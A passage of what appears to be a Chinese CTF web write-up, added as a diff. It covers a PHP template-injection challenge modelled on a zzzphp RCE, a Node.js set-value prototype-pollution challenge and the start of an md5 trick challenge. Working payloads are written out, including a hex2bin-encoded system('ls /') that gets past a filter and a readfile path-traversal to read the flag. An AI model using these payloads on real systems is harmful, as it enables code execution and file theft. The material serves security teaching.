+            <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'mod'</span><span class="p">,</span> <span class="s1">'%'</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+            <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'not'</span><span class="p">,</span> <span class="s1">'!'</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'/\{|}/'</span><span class="p">,</span> <span class="nv">$ifstr</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s1">'很抱歉，模板中有错误的判断,请修正'</span><span class="mf">.</span><span class="nv">$ifstr</span><span class="p">);</span>
+            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="o">@</span><span class="k">eval</span><span class="p">(</span> <span class="s1">'if('</span> <span class="mf">.</span> <span class="nv">$ifstr</span> <span class="mf">.</span> <span class="s1">'){$flag="if";}else{$flag="else";}'</span> <span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'/([\s\S]*)?\{else\}([\s\S]*)?/'</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span> <span class="mi">2</span> <span class="p">][</span> <span class="nv">$i</span> <span class="p">],</span> <span class="nv">$matches2</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="k">switch</span> <span class="p">(</span> <span class="nv">$flag</span> <span class="p">)</span> <span class="p">{</span>
+                    <span class="k">case</span> <span class="s1">'if'</span><span class="o">:</span>
+                        <span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$matches2</span><span class="p">[</span> <span class="mi">1</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+                            <span class="nv">$out_html</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$matches2</span><span class="p">[</span> <span class="mi">1</span> <span class="p">];</span>
+                        <span class="p">}</span>
+                        <span class="k">break</span><span class="p">;</span>
+                    <span class="k">case</span> <span class="s1">'else'</span><span class="o">:</span>
+                        <span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$matches2</span><span class="p">[</span> <span class="mi">2</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+                            <span class="nv">$out_html</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$matches2</span><span class="p">[</span> <span class="mi">2</span> <span class="p">];</span>
+                        <span class="p">}</span>
+                        <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="nv">$flag</span> <span class="o">==</span> <span class="s1">'if'</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$out_html</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span> <span class="mi">2</span> <span class="p">][</span> <span class="nv">$i</span> <span class="p">];</span>
+            <span class="p">}</span>
+            <span class="nv">$pattern2</span> <span class="o">=</span> <span class="s1">'/\{if([0-9]):/'</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span> <span class="nv">$pattern2</span><span class="p">,</span> <span class="nv">$out_html</span><span class="p">,</span> <span class="nv">$matches3</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$out_html</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'{if'</span> <span class="mf">.</span> <span class="nv">$matches3</span><span class="p">[</span> <span class="mi">1</span> <span class="p">],</span> <span class="s1">'{if'</span><span class="p">,</span> <span class="nv">$out_html</span> <span class="p">);</span>
+                <span class="nv">$out_html</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'{else'</span> <span class="mf">.</span> <span class="nv">$matches3</span><span class="p">[</span> <span class="mi">1</span> <span class="p">]</span> <span class="mf">.</span> <span class="s1">'}'</span><span class="p">,</span> <span class="s1">'{else}'</span><span class="p">,</span> <span class="nv">$out_html</span> <span class="p">);</span>
+                <span class="nv">$out_html</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'{end if'</span> <span class="mf">.</span> <span class="nv">$matches3</span><span class="p">[</span> <span class="mi">1</span> <span class="p">]</span> <span class="mf">.</span> <span class="s1">'}'</span><span class="p">,</span> <span class="s1">'{end if}'</span><span class="p">,</span> <span class="nv">$out_html</span> <span class="p">);</span>
+                <span class="nv">$out_html</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">parserIfLabel</span><span class="p">(</span> <span class="nv">$out_html</span> <span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nv">$content</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="nv">$matches</span><span class="p">[</span> <span class="mi">0</span> <span class="p">][</span> <span class="nv">$i</span> <span class="p">],</span> <span class="nv">$out_html</span><span class="p">,</span> <span class="nv">$content</span> <span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">splits</span><span class="p">(</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$str</span><span class="o">=</span><span class="s1">','</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">array</span><span class="p">(</span> <span class="s1">''</span> <span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$str</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">explode</span><span class="p">(</span> <span class="nv">$str</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="考点-1">考点</h3>
+
+<ul>
+  <li>模板注入</li>
+  <li>代码审计</li>
+</ul>
+
+<h3 id="思路-2">思路</h3>
+
+<ul>
+  <li>
+    <p>这道题的代码与zzzphpV1.6.1中的代码相似，可以参考<a href="https://www.anquanke.com/post/id/173991#h2-2">zzzphpV1.6.1 远程代码执行漏洞简单分析</a>进行功能的分析</p>
+
+    <p>比文章中多了一个danger_key函数</p>
+
+    <p><img src="https://img-blog.csdnimg.cn/20200825081056239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNjk3MTA5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
+
+    <p>另外还增加了一些别的过滤条件</p>
+  </li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'/\{|}/'</span><span class="p">,</span> <span class="nv">$ifstr</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s1">'很抱歉，模板中有错误的判断,请修正'</span><span class="mf">.</span><span class="nv">$ifstr</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">splits</span><span class="p">(</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$str</span><span class="o">=</span><span class="s1">','</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">array</span><span class="p">(</span> <span class="s1">''</span> <span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span> <span class="nv">$s</span><span class="p">,</span> <span class="nv">$str</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">explode</span><span class="p">(</span> <span class="nv">$str</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>对于<code class="language-plaintext highlighter-rouge">$pattern = '/{if:([sS]+?)}([sS]*?){ends+if}/';</code></p>
+
+    <p>参考文章中给出的匹配规则：<code class="language-plaintext highlighter-rouge">{if:(匹配内容)}(匹配内容){end if}</code></p>
+
+    <p>假如匹配的内容为<code class="language-plaintext highlighter-rouge">{if:phpinfo()};{end if}</code></p>
+
+    <p>则最后经过</p>
+
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">@</span><span class="k">eval</span><span class="p">(</span> <span class="s1">'if('</span> <span class="mf">.</span> <span class="nv">$ifstr</span> <span class="mf">.</span> <span class="s1">'){$flag="if";}else{$flag="else";}'</span> <span class="p">);</span>
+</code></pre></div>    </div>
+
+    <p>拼接出来为<code class="language-plaintext highlighter-rouge">if(phpinfo()){$flag="if";}else{$flag="else";}</code></p>
+
+    <p>文章给出的payload：<code class="language-plaintext highlighter-rouge">{if:assert($_request[phpinfo()])}phpinfo();{end if}</code></p>
+
+    <p>如果正则不好理解的可以到这里进行测试https://regex101.com/，这个网站可以直接给出要匹配的字符，方便理解。</p>
+
+    <p><img src="https://img-blog.csdnimg.cn/2020082508111992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNjk3MTA5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /></p>
+  </li>
+  <li>
+    <p>调试分析</p>
+
+    <p>输入<code class="language-plaintext highlighter-rouge">{if:phpinfo()};{end if}</code></p>
+
+    <p>匹配内容为phpinfo()，经过danger_key过滤就将php过滤掉了。</p>
+
+    <p>只要绕过这个过滤就好了。发现hex2bin没有被过滤</p>
+
+    <p>构造system(ls /)：hex2bin(73797374656d)(‘ls /’)</p>
+
+    <p><img src="https://img-blog.csdnimg.cn/20200825081150232.png#pic_center" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A1dvLzyb-1598313965688)(D:/Notes/web%25E5%25AE%2589%25E5%2585%25A8/assets/image-20200824104953320.png)]" /></p>
+
+    <p>成功执行。</p>
+  </li>
+</ul>
+
+<h3 id="payload-1">payload</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="k">if</span><span class="o">:</span><span class="p">(</span><span class="nb">hex2bin</span><span class="p">(</span><span class="s1">'7265616466696c65'</span><span class="p">))(</span><span class="s1">'../../../../../../flag'</span><span class="p">)};{</span><span class="n">end</span> <span class="k">if</span><span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="web4littlegame">web4：littlegame</h2>
+
+<h3 id="题目源码-1">题目源码：</h3>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">setFn</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">set-value</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nc">Router</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">COMMODITY</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">sword</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Gold</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">20</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">50</span><span class="dl">"</span><span class="p">},</span>
+    <span class="c1">// Times have changed</span>
+    <span class="dl">"</span><span class="s2">gun</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Gold</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">100</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">200</span><span class="dl">"</span><span class="p">}</span>
+<span class="p">}</span>
+<span class="kd">const</span> <span class="nx">MOBS</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">Lv1</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Bounty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">},</span>
+    <span class="dl">"</span><span class="s2">Lv2</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">5</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Bounty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">10</span><span class="dl">"</span><span class="p">},</span>
+    <span class="dl">"</span><span class="s2">Lv3</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">10</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Bounty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">15</span><span class="dl">"</span><span class="p">},</span>
+    <span class="dl">"</span><span class="s2">Lv4</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">20</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Bounty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">30</span><span class="dl">"</span><span class="p">},</span>
+    <span class="dl">"</span><span class="s2">Lv5</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">50</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Bounty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">65</span><span class="dl">"</span><span class="p">},</span>
+    <span class="dl">"</span><span class="s2">Lv6</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">80</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Bounty</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">100</span><span class="dl">"</span><span class="p">}</span>
+<span class="p">}</span>
+<span class="kd">const</span> <span class="nx">BOSS</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// Times have not changed</span>
+    <span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">201</span><span class="dl">"</span>
+<span class="p">}</span>
+<span class="kd">const</span> <span class="nx">Admin</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">password1</span><span class="dl">"</span><span class="p">:</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">p1</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">password2</span><span class="dl">"</span><span class="p">:</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">p2</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">password3</span><span class="dl">"</span><span class="p">:</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">p3</span>
+<span class="p">}</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/BuyWeapon</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// not implement</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">BOOS has said 'Times have not changed'!</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/EarnBounty</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// not implement</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">BOOS has said 'Times have not changed'!</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/ChallengeBOSS</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// not implement</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">BOOS has said 'Times have not changed'!</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/DeveloperControlPanel</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// not implement</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">key</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">){</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">What's your problem?</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">key</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
+        <span class="kd">let</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">Admin</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">===</span> <span class="nx">password</span><span class="p">){</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">flag</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wrong password!Are you Admin?</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/SpawnPoint</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">knight</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="dl">"</span><span class="s2">HP</span><span class="dl">"</span><span class="p">:</span> <span class="mi">1000</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Gold</span><span class="dl">"</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Firepower</span><span class="dl">"</span><span class="p">:</span> <span class="mi">10</span>
+    <span class="p">}</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Let's begin!</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/Privilege</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Why not ask witch for help?</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">knight</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">){</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/SpawnPoint</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">NewAttributeKey</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">NewAttributeValue</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">What's your problem?</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+            <span class="kd">let</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">NewAttributeKey</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
+            <span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">NewAttributeValue</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
+            <span class="nf">setFn</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">knight</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Let's have a check!</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h3 id="考点-2">考点</h3>
+
+<ul>
+  <li>
+    <p>set-value库 原型链污染，可参考：https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</p>
+
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">setFn</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">set-value</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">paths</span> <span class="o">=</span> <span class="p">[</span>
+  <span class="dl">'</span><span class="s1">constructor.prototype.a0</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">__proto__.a1</span><span class="dl">'</span><span class="p">,</span>
+<span class="p">];</span>
+  
+<span class="kd">function</span> <span class="nf">check</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">p</span> <span class="k">of</span> <span class="nx">paths</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nf">setFn</span><span class="p">({},</span> <span class="nx">p</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">paths</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if </span><span class="p">(({})[</span><span class="s2">`a</span><span class="p">${</span><span class="nx">i</span><span class="p">}</span><span class="s2">`</span><span class="p">]</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Yes with </span><span class="p">${</span><span class="nx">paths</span><span class="p">[</span><span class="nx">i</span><span class="p">]}</span><span class="s2">`</span><span class="p">);</span>
+      <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+  
+<span class="nf">check</span><span class="p">();</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="思路-3">思路</h3>
+
+<ul>
+  <li>使用参考文章中的方法，将指定的变量加入Admin的原型。</li>
+  <li>然后访问即可</li>
+</ul>
+
+<h3 id="payload-2">payload</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NewAttributeKey=constructor.prototype.a0&amp;NewAttributeValue=true
+</code></pre></div></div>
+
+<h2 id="web5easytrick">web5：easytrick</h2>
+
+<h3 id="题目源码-2">题目源码</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">trick</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$trick1</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$trick2</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick1</span> <span class="o">=</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick1</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">5</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">){</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">"你太长了"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick1</span> <span class="o">!==</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick2</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick1</span><span class="p">)</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick1</span> <span class="o">!=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">trick2</span><span class="p">){</span>
+            <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/flag"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
